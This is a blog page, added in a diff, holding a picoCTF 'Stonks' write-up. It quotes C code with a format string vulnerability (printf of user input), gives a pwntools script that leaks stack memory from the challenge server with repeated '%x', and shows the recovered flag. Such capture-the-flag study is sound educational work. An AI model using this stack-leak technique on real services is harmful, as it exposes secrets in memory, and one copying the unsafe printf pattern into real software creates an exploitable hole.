@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>My Blog - 2021-03-picoCTF - stonks</title>
+
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="Abraxus">
+    <!-- FontAwesome JS-->
+    <script defer src="../../assets/js/fontawesome.min.js"></script>
+
+    <!-- Theme CSS -->
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body class="theme-bg-light">
+
+    <header class="header text-center">
+    <h1 class="blog-name pt-lg-4 mb-0"><a class="no-text-decoration" href="index.html">Abraxus's Blog</a></h1>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div id="navigation" class="collapse navbar-collapse flex-column">
+            <div class="profile-section pt-3 pt-lg-0">
+                <img class="profile-image mb-3 rounded-circle mx-auto" src="../../assets/images/profile.png" alt="image">
+
+                <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
+                <ul class="social-list list-inline py-3 mx-auto">
+                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
+                </ul><!--//social-list-->
+                <hr>
+            </div><!--//profile-section-->
+
+            <ul class="navbar-nav flex-column text-center">
+                <li class="nav-item">
+                    <a class="nav-link" href="../../index.html"><i class="fas fa-home fa-fw me-2"></i>Blog Home <i class="fas fa-home fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../about.html"><i class="fas fa-user fa-fw me-2"></i>About Me <i class="fas fa-user fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../blog-posts.html"><i class="fas fa-bookmark fa-fw me-2"></i>Blog Posts <i class="fas fa-bookmark fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../writeups.html"><i class="fas fa-flag fa-fw me-2"></i>Writeups <i class="fas fa-flag fa-fw me-2"></i></a>
+                </li>
+            </ul>
+
+            <div class="my-2 my-md-3 text-center">
+                <a class="btn btn-primary" href="https://github.com/Kasimir123" target="_blank">Get in Touch</a>
+            </div>
+        </div>
+    </nav>
+</header>
+
+    <div class="main-wrapper">
+
+        <article class="markdown-section my-5 mx-5">
+            <h1 id="picoctf-stonks-write-up">picoCTF Stonks Write Up</h1>
+<h2 id="details">Details:</h2>
+<p>Points: 20</p>
+<p>Jeopardy style CTF</p>
+<p>Category: Binary Exploitation</p>
+<p>Comments: I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 53437</p>
+<h2 id="write-up">Write up:</h2>
+<p>Looking through vuln.c we find an interesting function:</p>
+<div class="lang-python editor-colors">int buy_stonks(Portfolio *p) {
+	if (!p) {
+		return 1;
+	}
+	char api_buf[FLAG_BUFFER];
+	FILE *f = fopen("api","r");
+	if (!f) {
+		printf("Flag file not found. Contact an admin.\n");
+		exit(1);
+	}
+	fgets(api_buf, FLAG_BUFFER, f);
+
+	int money = p->money;
+	int shares = 0;
+	Stonk *temp = NULL;
+	printf("Using patented AI algorithms to buy stonks\n");
+	while (money > 0) {
+		shares = (rand() % money) + 1;
+		temp = pick_symbol_with_AI(shares);
+		temp->next = p->head;
+		p->head = temp;
+		money -= shares;
+	}
+	printf("Stonks chosen\n");
+
+	// TODO: Figure out how to read token from file, for now just ask
+
+	char *user_buf = malloc(300 + 1);
+	printf("What is your API token?\n");
+	scanf("%300s", user_buf);
+	printf("Buying stonks with token:\n");
+	printf(user_buf);
+
+	// TODO: Actually use key to interact with API
+
+	view_portfolio(p);
+
+	return 0;
+}
+</div>
+<p>This function reads the flag onto the stack and then asks the user to enter input before printing it using printf. Based on this we know that this is a format string vulnerability and that we want to read off of the stack.</p>
+<p>I then wrote the following script to connect to the server and send lots of %x (prints stack) before reading and parsing that to ascii:</p>
+<div class="lang-python editor-colors"># import pwntools
+from pwn import *
+
+# string to write to
+s = ""
+
+# open up remote connection
+r = remote('mercury.picoctf.net', 53437)
+
+# get to vulnerability
+r.recvuntil("View my")
+r.send("1\n")
+r.recvuntil("What is your API token?\n")
+
+# send string to print stack
+r.send("%x" + "-%x"*40 + "\n")
+
+# receive until the line we want
+r.recvline()
+
+# read in line
+x = r.recvline()
+
+# remove unwanted components
+x = x[:-1].decode()
+
+# parse to characters
+for i in x.split('-'):
+	if len(i) == 8:
+		a = bytearray.fromhex(i)
+
+		for b in reversed(a):
+			if b > 32 and b < 128:
+				s += chr(b)
+
+# print string
+print(s)
+</div>
+<p>When run this program prints:</p>
+<pre><code>Opening connection to mercury.picoctf.net on port 53437: Done
+M!MpicoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}@$0E@x%Eo
+</code></pre>
+<p>And the flag was:</p>
+<pre><code>picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}
+</code></pre>
+
+        </article>
+
+        <footer class="footer text-left py-2 theme-bg-dark">
+
+    <small class="copyright">&nbsp;Generated by <a href="https://github.com/Kasimir123/Blog-Generator" target="_blank">Blog Generator</a> from Kasimir123</small>
+
+</footer>
+
+    </div><!--//main-wrapper-->
+    <!-- Javascript -->
+    <script src="../../assets/js/popper.min.js"></script>
+    <script src="../../assets/js/bootstrap.min.js"></script>
+</body>
+</html>
